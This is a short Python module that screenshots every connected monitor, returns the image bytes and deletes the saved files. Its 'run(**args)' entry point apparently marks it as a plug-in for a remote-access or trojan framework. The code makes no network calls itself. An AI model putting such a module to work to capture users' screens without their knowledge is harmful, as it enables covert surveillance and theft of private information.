# Source used: https://pyshark.com/take-screenshot-using-python/
# Source used: https://pypi.org/project/screeninfo/
import os
import pyautogui
from screeninfo import get_monitors

def run(**args):
    print("[*] Taking screenshot.")
    
    screenshots_bytes = []
    monitors = []
    for monitor in get_monitors():
        monitors.append(monitor)
        print(monitor)
    
    for i in range(0, len(monitors)):
        screenshot_name = "screenshot" + f"{i}" + ".jpg"
        screenshot = pyautogui.screenshot(region=(monitors[i].x, monitors[i].y, monitors[i].width, monitors[i].height))
        screenshot.save(screenshot_name)
    
        with open(screenshot_name, "rb") as f:
            image_bytes = f.read()
            screenshots_bytes.append(image_bytes)
        
        os.remove(screenshot_name)
    
    return screenshots_bytes
